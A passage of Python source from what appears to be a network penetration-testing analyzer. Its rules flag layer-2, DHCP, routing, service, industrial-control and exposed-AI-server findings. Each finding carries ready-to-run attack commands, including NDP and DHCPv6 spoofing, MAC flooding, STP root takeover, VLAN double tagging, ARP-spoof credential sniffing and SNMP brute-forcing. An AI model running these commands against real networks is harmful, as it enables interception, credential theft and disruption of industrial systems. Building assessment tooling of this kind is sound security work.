    name = "Multiple Gateways Detected"
    category = Category.NETWORK_INTEL
    severity = Severity.INFO

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        routers = [d for d in ctx.devices if d.device_type in ("router", "gateway", "firewall")]
        if len(routers) < 2:
            return []
        affected = [_device_info(r) for r in routers]
        return [Finding(
            rule_id=self.rule_id,
            name=self.name,
            category=self.category,
            severity=self.severity,
            description=(
                "Multiple routers/gateways were detected on the network. This reveals "
                "network segmentation points and potential redundancy configurations "
                "worth investigating during assessment."
            ),
            affected_devices=affected,
            evidence=[f"{len(routers)} routers/gateways detected"],
            tools=[
                ToolRecommendation(
                    name="traceroute",
                    command="traceroute -n {ip}",
                    description="Trace routing path to discover network topology",
                ),
            ],
        )]


class NDPSpoofingRiskRule:
    rule_id = "L2-004"
    name = "IPv6 NDP Spoofing Risk"
    category = Category.LAYER2
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        icmpv6_obs = ctx.observations_by_type.get("icmpv6", [])
        affected: dict[str, dict] = {}
        for obs in icmpv6_obs:
            raw = _parse_raw_data(obs)
            icmp_type = raw.get("icmpv6_type")
            override = raw.get("override", False)
            if icmp_type == "neighbor_advertisement" and override:
                mac = obs.device_mac
                dev = ctx.device_map.get(mac)
                # Only flag if sender is NOT a known router
                if dev and dev.device_type not in ("router", "gateway", "firewall"):
                    if mac not in affected:
                        affected[mac] = _device_info(dev)
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                "IPv6 Neighbor Advertisement packets with the Override flag were detected "
                "from non-router devices. NDP is the IPv6 equivalent of ARP and has no "
                "built-in authentication — an attacker can inject spoofed NAs to redirect "
                "IPv6 traffic through their machine."
            ),
            affected_devices=list(affected.values()),
            evidence=[f"{len(affected)} non-router device(s) sending NA with override flag"],
            tools=[
                ToolRecommendation(
                    name="THC-IPv6 parasite6",
                    command="parasite6 {interface}",
                    description="NDP spoofing daemon — redirect IPv6 traffic via spoofed Neighbor Advertisements",
                    install_hint="apt install thc-ipv6",
                ),
            ],
        )]


class MACDiversityRule:
    rule_id = "L2-005"
    name = "High MAC Diversity — Consider Verifying Port Security"
    category = Category.LAYER2
    severity = Severity.MEDIUM

    MAC_THRESHOLD = 100

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        unique_macs = len(ctx.devices)
        if unique_macs < self.MAC_THRESHOLD:
            return []
        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                f"{unique_macs} unique MAC addresses observed on this segment. "
                "High MAC diversity detected — consider verifying port security controls. "
                "Without 802.1X or port security the segment may be vulnerable to CAM "
                "table overflow (MAC flooding) which forces the switch to broadcast all "
                "traffic like a hub."
            ),
            affected_devices=[],
            evidence=[f"{unique_macs} unique MACs observed (threshold: {self.MAC_THRESHOLD})"],
            tools=[
                ToolRecommendation(
                    name="macof",
                    command="macof -i {interface}",
                    description="Flood switch CAM table to force hub-mode broadcast",
                    install_hint="apt install dsniff",
                ),
                ToolRecommendation(
                    name="macchanger",
                    command="macchanger -m <trusted_mac> {interface}",
                    description="Clone a trusted MAC address for MAB (MAC Authentication Bypass)",
                    install_hint="apt install macchanger",
                ),
            ],
        )]


class DiscoveryProtocolRule:
    rule_id = "L2-006"
    name = "CDP/LLDP Discovery Protocol Detected"
    category = Category.LAYER2
    severity = Severity.INFO

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        cdp_obs = ctx.observations_by_type.get("cdp", [])
        lldp_obs = ctx.observations_by_type.get("lldp", [])
        ssdp_obs = ctx.observations_by_type.get("ssdp", [])

        infra_devices: dict[str, dict] = {}
        evidence: list[str] = []

        # Direct CDP/LLDP observations
        for obs in cdp_obs:
            mac = obs.device_mac
            if mac not in infra_devices:
                dev = ctx.device_map.get(mac)
                infra_devices[mac] = _device_info(dev) if dev else {"mac": mac}
            raw = _parse_raw_data(obs)
            if raw.get("device_id"):
                evidence.append(f"CDP: {raw['device_id']} ({mac})")

        for obs in lldp_obs:
            mac = obs.device_mac
            if mac not in infra_devices:
                dev = ctx.device_map.get(mac)
                infra_devices[mac] = _device_info(dev) if dev else {"mac": mac}
            raw = _parse_raw_data(obs)
            sys_name = raw.get("system_name") or raw.get("chassis_id", "")
            if sys_name:
                evidence.append(f"LLDP: {sys_name} ({mac})")

        # Fallback: SSDP from infrastructure-like devices
        if not infra_devices:
            for obs in ssdp_obs:
                raw = _parse_raw_data(obs)
                server = raw.get("server", "").lower()
                if any(kw in server for kw in ("cisco", "juniper", "aruba", "switch", "router")):
                    mac = obs.device_mac
                    if mac not in infra_devices:
                        dev = ctx.device_map.get(mac)
                        infra_devices[mac] = _device_info(dev) if dev else {"mac": mac}
                        evidence.append(f"SSDP: {raw.get('server', '')} ({mac})")

        if not infra_devices:
            return []

        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                "Network infrastructure devices were detected via CDP/LLDP discovery "
                "protocols. These protocols leak infrastructure details: hostnames, "
                "IOS versions, VLAN IDs, management IP addresses, and port descriptions."
            ),
            affected_devices=list(infra_devices.values()),
            evidence=evidence[:10] or [f"{len(infra_devices)} infrastructure device(s) detected"],
            tools=[
                ToolRecommendation(
                    name="Yersinia (CDP Enum)",
                    command="yersinia cdp -attack 0 -interface {interface}",
                    description="Enumerate CDP neighbors to discover switch/router details",
                    install_hint="apt install yersinia",
                ),
                ToolRecommendation(
                    name="lldpcli",
                    command="lldpcli show neighbors detail",
                    description="Display LLDP neighbor information (system name, IPs, VLANs)",
                    install_hint="apt install lldpd",
                ),
                ToolRecommendation(
                    name="tcpdump (CDP/LLDP)",
                    command="tcpdump -i {interface} -nn -v 'ether proto 0x88cc or ether host 01:00:0c:cc:cc:cc'",
                    description="Capture raw CDP/LLDP frames to extract infrastructure details",
                ),
            ],
        )]


class MultipleDHCPServersRule:
    rule_id = "DH-003"
    name = "Multiple DHCP Servers Detected"
    category = Category.DHCP
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        dhcp_obs = ctx.observations_by_type.get("dhcpv4", [])
        server_ids: dict[str, set[str]] = {}
        for obs in dhcp_obs:
            raw = _parse_raw_data(obs)
            msg_type = raw.get("message_type")
            if msg_type in (2, 5):  # OFFER or ACK
                raw_opts = raw.get("raw_options", {})
                server_id = raw_opts.get("server_id") if isinstance(raw_opts, dict) else None
                if server_id:
                    server_ids.setdefault(server_id, set()).add(obs.device_mac)
        if len(server_ids) < 2:
            return []
        evidence = [f"DHCP server at {ip} (from {len(macs)} device(s))"
                    for ip, macs in server_ids.items()]
        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                f"{len(server_ids)} distinct DHCP servers detected on the segment. "
                "Multiple DHCP servers may indicate a rogue DHCP server deployment, "
                "a split-scope DHCP configuration, or an active DHCP attack."
            ),
            affected_devices=[],
            evidence=evidence,
            tools=[
                ToolRecommendation(
                    name="dhcpdump",
                    command="dhcpdump -i {interface}",
                    description="Monitor DHCP traffic to identify and compare server responses",
                    install_hint="apt install dhcpdump",
                ),
            ],
        )]


class DHCPv6ActivityRule:
    rule_id = "DH-004"
    name = "DHCPv6 Activity Detected — IPv6 MITM Surface"
    category = Category.DHCP
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        dhcpv6_obs = ctx.observations_by_type.get("dhcpv6", [])
        if not dhcpv6_obs:
            return []
        affected: dict[str, dict] = {}
        for obs in dhcpv6_obs:
            mac = obs.device_mac
            if mac not in affected:
                dev = ctx.device_map.get(mac)
                affected[mac] = _device_info(dev) if dev else {"mac": mac}
        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                "DHCPv6 traffic was observed on the wire. Clients sending DHCPv6 Solicit "
                "messages will accept configuration from any DHCPv6 server on the link. "
                "An attacker can respond as a rogue DHCPv6 server to assign themselves as "
                "the DNS server, gaining control over all name resolution — even on "
                "IPv4-primary networks."
            ),
            affected_devices=list(affected.values())[:20],
            evidence=[f"{len(affected)} device(s) sending DHCPv6 messages"],
            tools=[
                ToolRecommendation(
                    name="mitm6",
                    command="mitm6 -d {domain} -i {interface}",
                    description="DHCPv6 DNS takeover — become the IPv6 DNS server for WPAD/NTLM relay",
                    url="https://github.com/dirkjanm/mitm6",
                    install_hint="pip install mitm6",
                ),
                ToolRecommendation(
                    name="Bettercap (DHCPv6 Spoof)",
                    command="bettercap -iface {interface} -eval 'set dhcp6.spoof.domains {domain}; dhcp6.spoof on; dns.spoof on'",
                    description="Combined DHCPv6 + DNS spoofing",
                    url="https://github.com/bettercap/bettercap",
                ),
                ToolRecommendation(
                    name="Pretender",
                    command="pretender -i {interface} -d {domain}",
                    description="Cross-platform LLMNR/mDNS/NBT-NS + DHCPv6 poisoner — all protocols enabled by default",
                    url="https://github.com/RedTeamPentesting/pretender",
                ),
            ],
        )]


class ICMPRedirectRiskRule:
    rule_id = "RT-003"
    name = "ICMP Redirect Risk — Gateway on Segment"
    category = Category.ROUTING
    severity = Severity.LOW

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        routers = [d for d in ctx.devices
                   if d.device_type in ("router", "gateway", "firewall") and d.ip_v4]
        if not routers:
            return []
        affected = [_device_info(r) for r in routers]
        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                "A gateway was identified on this segment. ICMP Redirect messages could "
                "be sent to reroute traffic through the attacker. Most modern operating "
                "systems ignore ICMP redirects by default, but legacy hosts may still "
                "accept them."
            ),
            affected_devices=affected,
            evidence=[f"Gateway at {routers[0].ip_v4}"],
            tools=[
                ToolRecommendation(
                    name="Scapy (ICMP Redirect)",
                    command="scapy -c \"send(IP(src='{gateway_ip}',dst='{target_ip}')/ICMP(type=5,code=1,gw='{attacker_ip}')/IP(src='{target_ip}',dst='0.0.0.0'))\"",
                    description="Send ICMP Redirect to reroute target traffic through attacker",
                    install_hint="pip install scapy",
                ),
            ],
        )]


class PhantomIPRule:
    rule_id = "NI-004"
    name = "Phantom/Stale IP References Detected"
    category = Category.NETWORK_INTEL
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        known_ips: set[str] = set()
        for d in ctx.devices:
            if d.ip_v4:
                known_ips.add(d.ip_v4)
            if d.ip_v6:
                known_ips.add(d.ip_v6)

        arp_obs = ctx.observations_by_type.get("arp", [])
        phantom_refs: dict[str, list[str]] = {}
        for obs in arp_obs:
            raw = _parse_raw_data(obs)
            if raw.get("op") == 1:  # ARP Request
                dst_ip = raw.get("dst_ip")
                if dst_ip and dst_ip not in known_ips and dst_ip != "0.0.0.0":
                    phantom_refs.setdefault(dst_ip, [])
                    if obs.device_mac not in phantom_refs[dst_ip]:
                        phantom_refs[dst_ip].append(obs.device_mac)

        if not phantom_refs:
            return []

        evidence = []
        affected = []
        for ip, macs in list(phantom_refs.items())[:20]:
            evidence.append(f"ARP request for {ip} from {', '.join(macs[:3])}")
            for mac in macs:
                dev = ctx.device_map.get(mac)
                affected.append(
                    _device_info(dev, {"phantom_ip": ip}) if dev
                    else {"mac": mac, "phantom_ip": ip}
                )

        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                f"{len(phantom_refs)} IP address(es) are being requested via ARP but no "
                "device on the network owns them. This indicates stale configurations, "
                "decommissioned systems, or ghost entries. These phantom IPs may produce "
                "false positives in other findings — consider excluding them."
            ),
            affected_devices=affected[:20],
            evidence=evidence[:10],
            tools=[
                ToolRecommendation(
                    name="arp-scan",
                    command="arp-scan -l -I {interface}",
                    description="Full ARP scan to verify which IPs are actually alive",
                    install_hint="apt install arp-scan",
                ),
            ],
        )]


class VLANHoppingDTPRule:
    """Detect DTP (Dynamic Trunking Protocol) frames indicating trunk-capable ports."""
    rule_id = "L2-007"
    name = "VLAN Hopping — DTP/Trunk Port Detected"
    category = Category.LAYER2
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        # Look for CDP observations that reveal native VLAN or trunk info
        cdp_obs = ctx.observations_by_type.get("cdp", [])
        stp_obs = ctx.observations_by_type.get("stp", [])
        lldp_obs = ctx.observations_by_type.get("lldp", [])

        trunk_indicators = []
        affected = []

        for obs in cdp_obs:
            raw = _parse_raw_data(obs)
            if raw.get("native_vlan"):
                trunk_indicators.append(f"CDP reveals native VLAN {raw['native_vlan']} on {obs.device_mac}")
                dev = ctx.device_map.get(obs.device_mac)
                affected.append(_device_info(dev) if dev else {"mac": obs.device_mac})

        # STP BPDUs from multiple bridge IDs indicate trunk/spanning tree participation
        bridge_ids = set()
        for obs in stp_obs:
            raw = _parse_raw_data(obs)
            bridge_id = raw.get("bridge_id") or raw.get("bridge_mac")
            if bridge_id:
                bridge_ids.add(bridge_id)

        if len(bridge_ids) > 1:
            trunk_indicators.append(f"STP BPDUs from {len(bridge_ids)} different bridges detected — indicates trunk port")
            for obs in stp_obs[:5]:
                dev = ctx.device_map.get(obs.device_mac)
                if dev and _device_info(dev) not in affected:
                    affected.append(_device_info(dev))

        if not trunk_indicators:
            return []

        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                "Evidence of trunk port or DTP-capable port detected. An attacker on a trunk port can "
                "perform VLAN hopping attacks using 802.1Q double tagging or DTP negotiation, gaining "
                "access to traffic on other VLANs. This is a critical Layer 2 segmentation bypass."
            ),
            affected_devices=affected[:20],
            evidence=trunk_indicators[:10],
            tools=[
                ToolRecommendation(
                    name="Yersinia (DTP Attack)",
                    command="yersinia dtp -attack 1 -interface {interface}",
                    description="Negotiate DTP trunk to enable VLAN hopping — sends DTP frames to switch",
                    url="https://github.com/tomac/yersinia",
                ),
                ToolRecommendation(
                    name="Frogger (VLAN Hopper)",
                    command="./frogger.sh",
                    description="Interactive VLAN hopping script — detects DTP, native VLAN, and performs 802.1Q double tagging",
                    url="https://github.com/nccgroup/vlan-hopping",
                ),
                ToolRecommendation(
                    name="Scapy (Double Tagging)",
                    command="sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=<target_vlan>)/IP(dst='<target>')/ICMP(), iface='{interface}')",
                    description="Manual 802.1Q double tagging — craft packet that traverses native VLAN to target VLAN",
                ),
            ],
        )]


class VLANLeakageRule:
    """Detect devices appearing on multiple subnets — potential VLAN misconfiguration."""
    rule_id = "L2-008"
    name = "VLAN Leakage — Device on Multiple Subnets"
    category = Category.LAYER2
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        import ipaddress
        mac_subnets: dict[str, set[str]] = {}

        for obs in ctx.observations_by_type.get("arp", []):
            raw = _parse_raw_data(obs)
            ip_str = raw.get("src_ip")
            if not ip_str or ip_str == "0.0.0.0":
                continue
            try:
                net = str(ipaddress.ip_network(f"{ip_str}/20", strict=False))
            except ValueError:
                continue
            mac_subnets.setdefault(obs.device_mac, set()).add(net)

        # Find MACs that appear on multiple subnets
        multi_subnet = {mac: subnets for mac, subnets in mac_subnets.items() if len(subnets) > 1}

        if not multi_subnet:
            return []

        affected = []
        evidence = []
        for mac, subnets in list(multi_subnet.items())[:10]:
            dev = ctx.device_map.get(mac)
            info = _device_info(dev) if dev else {"mac": mac}
            info["subnets"] = list(subnets)
            affected.append(info)
            evidence.append(f"{mac} seen on subnets: {', '.join(sorted(subnets))}")

        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                f"{len(multi_subnet)} device(s) appear on multiple subnets. This may indicate "
                "VLAN misconfiguration, trunk port exposure, 802.1Q tagging issues, or an active "
                "VLAN hopping attack. Legitimate causes include routers and multi-homed devices."
            ),
            affected_devices=affected[:20],
            evidence=evidence[:10],
            tools=[
                ToolRecommendation(
                    name="VLAN Audit",
                    command="arp-scan -l -I {interface} && arp-scan -l -I {interface} -Q <vlan_id>",
                    description="ARP scan across VLANs to verify which devices are accessible from each",
                ),
                ToolRecommendation(
                    name="Nmap VLAN Scan",
                    command="nmap -sn -e {interface} 192.168.1.0/24 192.168.20.0/24",
                    description="Ping sweep across multiple subnets to verify cross-VLAN visibility",
                ),
            ],
        )]


class STPManipulationRiskRule:
    """Detect STP topology that could be manipulated for MITM."""
    rule_id = "L2-009"
    name = "STP Root Bridge Manipulation Risk"
    category = Category.LAYER2
    severity = Severity.HIGH

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        stp_obs = ctx.observations_by_type.get("stp", [])
        if not stp_obs:
            return []

        root_bridges = {}
        for obs in stp_obs:
            raw = _parse_raw_data(obs)
            root_mac = raw.get("root_mac")
            root_prio = raw.get("root_priority", 32768)
            bridge_mac = raw.get("bridge_mac")
            if root_mac:
                root_bridges[root_mac] = {"priority": root_prio, "bridge_mac": bridge_mac}

        if not root_bridges:
            return []

        affected = []
        evidence = []
        for root_mac, info in root_bridges.items():
            dev = ctx.device_map.get(root_mac)
            affected.append(_device_info(dev) if dev else {"mac": root_mac})
            evidence.append(f"Root bridge {root_mac} with priority {info['priority']}")

        return [Finding(
            rule_id=self.rule_id, name=self.name, category=self.category,
            severity=self.severity,
            description=(
                "STP (Spanning Tree Protocol) traffic detected with root bridge information. "
                "An attacker can send BPDUs with a lower priority to become the root bridge, "
                "forcing all network traffic to flow through their machine for interception."
            ),
            affected_devices=affected[:10],
            evidence=evidence[:5],
            tools=[
                ToolRecommendation(
                    name="Yersinia (STP Attack)",
                    command="yersinia stp -attack 4 -interface {interface}",
                    description="Claim STP root bridge role — all traffic reroutes through attacker",
                    url="https://github.com/tomac/yersinia",
                ),
                ToolRecommendation(
                    name="Scapy (STP Root)",
                    command="sendp(Ether(dst='01:80:c2:00:00:00')/LLC()/STP(rootprio=0, bridgeprio=0), iface='{interface}', loop=1, inter=2)",
                    description="Send STP BPDUs with priority 0 to claim root bridge",
                ),
            ],
        )]


# Service exploitation rules (parameterized)

@dataclass
class ServiceRuleConfig:
    rule_id: str
    service_names: list[str]
    name: str
    severity: Severity
    description: str
    tools: list[ToolRecommendation]


SERVICE_RULES: list[ServiceRuleConfig] = [
    ServiceRuleConfig(
        rule_id="SE-001",
        service_names=["telnet"],
        name="Telnet Service Detected — Cleartext Protocol",
        severity=Severity.HIGH,
        description=(
            "Telnet transmits all data including credentials in cleartext. By positioning "
            "as MITM (via ARP spoofing), all Telnet sessions to this host can be passively "
            "captured without any brute-forcing — credentials will appear in plaintext."
        ),
        tools=[
            ToolRecommendation(name="Bettercap (Passive Capture)", command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
                              description="ARP spoof target and passively capture Telnet credentials in cleartext",
                              url="https://github.com/bettercap/bettercap"),
            ToolRecommendation(name="Nmap Scripts", command="nmap -sV -p {port} --script=telnet-ntlm-info,telnet-encryption {ip}",
                              description="Enumerate Telnet service details and check for encryption support",
                              install_hint="apt install nmap"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-002",
        service_names=["ftp"],
        name="FTP Service Detected — Cleartext Protocol",
        severity=Severity.HIGH,
        description=(
            "FTP transmits credentials in cleartext and may allow anonymous access. "
            "Any FTP credentials used on the network can be passively captured via MITM. "
            "Check for anonymous login first — many FTP servers allow unauthenticated access."
        ),
        tools=[
            ToolRecommendation(name="Nmap FTP Scripts", command="nmap -sV -p {port} --script=ftp-anon,ftp-syst,ftp-vsftpd-backdoor {ip}",
                              description="Check anonymous access, server version, and known backdoors",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Bettercap (Passive Capture)", command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
                              description="Passively capture FTP credentials as users authenticate — no brute-force needed",
                              url="https://github.com/bettercap/bettercap"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-003",
        service_names=["smb", "cifs", "microsoft-ds"],
        name="SMB/CIFS Service Detected — Relay Target",
        severity=Severity.HIGH,
        description=(
            "SMB services were detected by active probing. SMB is a prime target for "
            "NTLM relay attacks — captured authentication from name resolution poisoning "
            "can be relayed directly to these hosts if SMB signing is not enforced. "
            "Validate relay viability with RelayKing before attacking."
        ),
        tools=[
            ToolRecommendation(name="RelayKing", command="relayking -tf targets.txt -o relay_targets.json",
                              description="Validate which SMB hosts have signing disabled and are relay-able",
                              url="https://github.com/depthsecurity/RelayKing-Depth"),
            ToolRecommendation(name="NetExec (nxc)", command="nxc smb {ip} -u '' -p '' --shares",
                              description="Test null session and enumerate shares",
                              url="https://github.com/Pennyw0rth/NetExec",
                              install_hint="pip install netexec"),
            ToolRecommendation(name="enum4linux-ng", command="enum4linux-ng -A {ip}",
                              description="Full SMB/CIFS enumeration (shares, users, groups)",
                              url="https://github.com/cddmp/enum4linux-ng",
                              install_hint="pip install enum4linux-ng"),
            ToolRecommendation(name="smbclient", command="smbclient -L //{ip} -N",
                              description="List available SMB shares anonymously",
                              install_hint="apt install smbclient"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-004",
        service_names=["snmp"],
        name="SNMP Service Detected",
        severity=Severity.HIGH,
        description=(
            "SNMP can expose detailed system configuration, network topology, and "
            "device information. SNMPv1/v2c use community strings sent in cleartext."
        ),
        tools=[
            ToolRecommendation(name="snmpwalk", command="snmpwalk -v2c -c public {ip}",
                              description="Walk SNMP MIB tree with default community string", install_hint="apt install snmp"),
            ToolRecommendation(name="onesixtyone", command="onesixtyone -c community.txt {ip}",
                              description="Brute-force SNMP community strings", install_hint="apt install onesixtyone"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-009",
        service_names=["modbus"],
        name="Modbus (ICS/SCADA) Service Detected",
        severity=Severity.CRITICAL,
        description=(
            "Modbus protocol detected — an industrial control system protocol with NO "
            "built-in authentication. Any device on the network can read/write registers."
        ),
        tools=[
            ToolRecommendation(name="mbtget", command="mbtget -a 1 -r 0 -n 10 {ip}",
                              description="Read Modbus holding registers", install_hint="cargo install mbtget"),
            ToolRecommendation(name="Metasploit Modbus",
                              command="msfconsole -x 'use auxiliary/scanner/scada/modbusdetect; set RHOSTS {ip}; run'",
                              description="Modbus device detection and enumeration"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-010",
        service_names=["dnp3"],
        name="DNP3 (ICS/SCADA) Service Detected",
        severity=Severity.CRITICAL,
        description="DNP3 protocol detected — used in power grid and water treatment SCADA systems.",
        tools=[
            ToolRecommendation(name="Metasploit DNP3",
                              command="msfconsole -x 'use auxiliary/scanner/scada/dnp3_version; set RHOSTS {ip}; run'",
                              description="DNP3 version detection and enumeration"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-011",
        service_names=["bacnet"],
        name="BACnet (Building Automation) Detected",
        severity=Severity.CRITICAL,
        description="BACnet protocol detected — used for HVAC, lighting, and building access control.",
        tools=[
            ToolRecommendation(name="Nmap BACnet",
                              command="nmap -sU -p 47808 --script=bacnet-info {ip}",
                              description="Enumerate BACnet device identity and properties via Nmap",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="BAC0 (Python)",
                              command="python3 -c \"import BAC0; network = BAC0.lite(); print(network.whois())\"",
                              description="BACnet device discovery and object enumeration via Python",
                              install_hint="pip install BAC0"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-012",
        service_names=["enip", "ethernet_ip"],
        name="EtherNet/IP (ICS) Service Detected",
        severity=Severity.CRITICAL,
        description="EtherNet/IP protocol detected — used by Allen-Bradley PLCs and industrial automation.",
        tools=[
            ToolRecommendation(name="enip-enumerate",
                              command="python -c \"from pycomm3 import CIPDriver; d = CIPDriver('{ip}'); d.open(); print(d.get_plc_info()); d.close()\"",
                              description="Enumerate EtherNet/IP device identity",
                              install_hint="pip install pycomm3"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-013",
        service_names=["iec61850"],
        name="IEC 61850 MMS (Power Grid) Service Detected",
        severity=Severity.CRITICAL,
        description=(
            "IEC 61850 MMS protocol detected — used for substation automation and "
            "protective relay control. Unauthorized access can disable grid protection."
        ),
        tools=[
            ToolRecommendation(name="Nmap MMS",
                              command="nmap -sT -p 102 --script=default {ip}",
                              description="Scan IEC 61850 MMS port (ISO-TSAP) for active services",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Metasploit IEC 61850",
                              command="msfconsole -x 'use auxiliary/scanner/scada/modbusdetect; set RHOSTS {ip}; set RPORT 102; run'",
                              description="Attempt IEC 61850 MMS service detection"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-014",
        service_names=["ethercat"],
        name="EtherCAT (Real-Time Control) Detected",
        severity=Severity.HIGH,
        description=(
            "EtherCAT real-time industrial Ethernet detected — used for motion control, "
            "robotics, and CNC machines. Disruption can cause physical equipment damage."
        ),
        tools=[
            ToolRecommendation(name="Wireshark (EtherCAT)",
                              command="wireshark -i {interface} -f 'ether proto 0x88a4'",
                              description="Capture and analyze EtherCAT frames (EtherType 0x88A4)"),
            ToolRecommendation(name="Nmap EtherCAT",
                              command="nmap -sT -p 34980 --script=default {ip}",
                              description="Scan EtherCAT UDP port for EoE (Ethernet over EtherCAT) gateway",
                              install_hint="apt install nmap"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-015",
        service_names=["modbus_rtu"],
        name="Modbus RTU/TCP (Legacy ICS) Service Detected",
        severity=Severity.CRITICAL,
        description=(
            "Modbus RTU over TCP detected — legacy serial protocol bridged to Ethernet "
            "with NO authentication. Direct read/write access to field device registers."
        ),
        tools=[
            ToolRecommendation(name="mbtget", command="mbtget -a 1 -r 0 -n 10 {ip}",
                              description="Read Modbus holding registers via RTU framing",
                              install_hint="cargo install mbtget"),
            ToolRecommendation(name="Metasploit Modbus",
                              command="msfconsole -x 'use auxiliary/scanner/scada/modbusdetect; set RHOSTS {ip}; run'",
                              description="Modbus device detection and enumeration"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-016",
        service_names=["ff_hse"],
        name="Foundation Fieldbus HSE (Process Control) Detected",
        severity=Severity.HIGH,
        description=(
            "Foundation Fieldbus HSE protocol detected — used in oil & gas, chemical, "
            "and refinery process control. Affects physical process variables."
        ),
        tools=[
            ToolRecommendation(name="Nmap FF HSE",
                              command="nmap -sU -sT -p 1089-1091,3622 --script=default {ip}",
                              description="Scan Foundation Fieldbus HSE ports for active services",
                              install_hint="apt install nmap"),
            ToolRecommendation(name="Wireshark (FF HSE Capture)",
                              command="wireshark -i {interface} -f 'udp port 1089 or udp port 1090 or udp port 1091'",
                              description="Capture and analyze Foundation Fieldbus HSE traffic"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-017",
        service_names=["canopen"],
        name="CANopen Gateway (Embedded Control) Detected",
        severity=Severity.HIGH,
        description=(
            "CANopen-over-Ethernet gateway detected — bridge to CAN bus controlling "
            "embedded machinery, conveyors, and automotive manufacturing equipment."
        ),
        tools=[
            ToolRecommendation(name="CANopen Python",
                              command="python3 -c \"import canopen; net = canopen.Network(); net.connect(channel='can0', bustype='socketcan'); net.scanner.search(); print(net.scanner.nodes)\"",
                              description="Enumerate CANopen network nodes via Python canopen library",
                              install_hint="pip install canopen"),
            ToolRecommendation(name="Nmap CAN Gateway",
                              command="nmap -sT -p 502,2000,4000,5000 --script=default {ip}",
                              description="Scan common CANopen gateway TCP ports for management interfaces",
                              install_hint="apt install nmap"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-024",
        service_names=["iolink"],
        name="IO-Link Master Gateway Detected",
        severity=Severity.MEDIUM,
        description=(
            "IO-Link master gateway detected — exposes sensor/actuator I/O port "
            "configuration via REST API. Lower blast radius than control protocols."
        ),
        tools=[
            ToolRecommendation(name="IO-Link API Enum",
                              command="curl -s http://{ip}/iolinkmaster/port | jq .",
                              description="Enumerate IO-Link master ports and connected devices"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-025",
        service_names=["ollama"],
        name="Ollama LLM Server Exposed",
        severity=Severity.CRITICAL,
        description=(
            "Ollama LLM server detected with NO authentication by default. "
            "Full model access, prompt injection, and data exfiltration risk. "
            "Attackers can enumerate models, run inference, and extract training data."
        ),
        tools=[
            ToolRecommendation(name="Ollama Models",
                              command="curl -s http://{ip}:11434/api/tags | jq '.models[].name'",
                              description="Enumerate loaded LLM models"),
            ToolRecommendation(name="Ollama Chat",
                              command="curl -s http://{ip}:11434/api/chat -d '{{\"model\":\"llama3\",\"messages\":[{{\"role\":\"user\",\"content\":\"test\"}}]}}'",
                              description="Test unauthenticated inference access"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-026",
        service_names=["vllm", "openai_compat", "sglang", "localai", "llamacpp", "lm_studio"],
        name="OpenAI-Compatible LLM API Exposed",
        severity=Severity.HIGH,
        description=(
            "OpenAI-compatible API endpoint detected. Supports model enumeration "
            "and inference. Many self-hosted LLM servers lack authentication."
        ),
        tools=[
            ToolRecommendation(name="Model Enumeration",
                              command="curl -s http://{ip}:{port}/v1/models | jq '.data[].id'",
                              description="List available models on the endpoint"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-027",
        service_names=["gradio", "stable_diffusion", "comfyui", "fooocus"],
        name="AI Image Generation UI Exposed",
        severity=Severity.HIGH,
        description=(
            "Gradio or Stable Diffusion WebUI detected. GPU resource abuse risk — "
            "unrestricted image generation and potential content policy violations."
        ),
        tools=[
            ToolRecommendation(name="SD WebUI API",
                              command="curl -s http://{ip}:7860/sdapi/v1/options | jq '.sd_model_checkpoint'",
                              description="Check loaded Stable Diffusion model"),
        ],
    ),
    ServiceRuleConfig(
        rule_id="SE-028",
